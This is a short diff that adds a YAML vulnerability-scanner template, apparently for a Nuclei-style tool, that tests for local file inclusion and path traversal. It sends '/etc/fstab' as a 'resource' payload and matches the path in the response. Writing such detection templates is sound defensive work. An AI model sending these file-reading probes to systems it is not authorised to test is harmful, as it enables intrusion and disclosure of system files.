@@ -1,0 +1,20 @@
+id: lfi6-0812
+name: 'Traversal in resource'
+severity: high
+type: active
+tags:
+  - lfi
+  - traversal
+  - file
+description: 'Reads sensitive file via resource'
+requests:
+  - method: GET
+    path: '{{BaseURL}}'
+    payloads:
+      resource:
+        - '/etc/fstab'
+    matchers:
+      - type: word
+        part: body
+        words:
+          - '/etc/fstab'
